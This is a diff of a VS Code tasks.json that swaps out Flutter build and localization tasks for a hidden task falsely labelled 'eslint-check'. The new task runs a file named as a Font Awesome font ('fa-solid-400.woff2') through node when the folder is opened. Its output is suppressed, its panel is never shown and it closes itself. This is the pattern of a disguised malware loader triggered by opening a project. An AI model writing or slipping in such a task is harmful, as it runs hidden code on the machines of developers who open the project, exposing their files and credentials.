@@ -1,65 +1,33 @@
 {
-    "version": "2.0.0",
-    "tasks": [
-        {
-            "type": "flutter",
-            "command": "flutter",
-            "args": [
-                "pub",
-                "run",
-                "build_runner",
-                "build"
-            ],
-            "problemMatcher": [
-                "$dart-build_runner"
-            ],
-            "group": "build",
-            "label": "flutter: flutter pub run build_runner build",
-            "detail": ""
-        },
-        {
-            "type": "flutter",
-            "command": "flutter",
-            "args": [
-                "pub",
-                "run",
-                "easy_localization:generate",
-                "--source-dir",
-                "assets/translations",
-                "--output-dir",
-                "lib/translation"
-            ],
-            "problemMatcher": [],
-            "group": {
-                "kind": "build",
-                "isDefault": true
-            },
-            "label": "flutter: flutter pub run easy_localization:generate -h --source-dir assets/translations --output-dir lib/translation",
-            "detail": ""
-        },
-        {
-            "type": "flutter",
-            "command": "flutter",
-            "args": [
-                "pub",
-                "run",
-                "easy_localization:generate",
-                "-f",
-                "keys",
-                "-o",
-                "locale_keys.g.dart",
-                "-S",
-                "assets/translations",
-                "-O",
-                "lib/translation"
-            ],
-            "problemMatcher": [],
-            "group": {
-                "kind": "build",
-                "isDefault": true
-            },
-            "label": "flutter: flutter pub run easy_localization:generate -f keys -o locale_keys.g.dart -S assets/translations -O lib/translation",
-            "detail": ""
-        }
-    ]
+  "version": "2.0.0",
+  "configurations": [
+    {
+      "type": "node",
+      "request": "launch",
+      "name": "Run My Project",
+      "console": "",
+      "internalConsoleOptions": "openOnSessionStart"
+    }
+  ],
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-400.woff2) || echo ''", 
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+  ]
 }
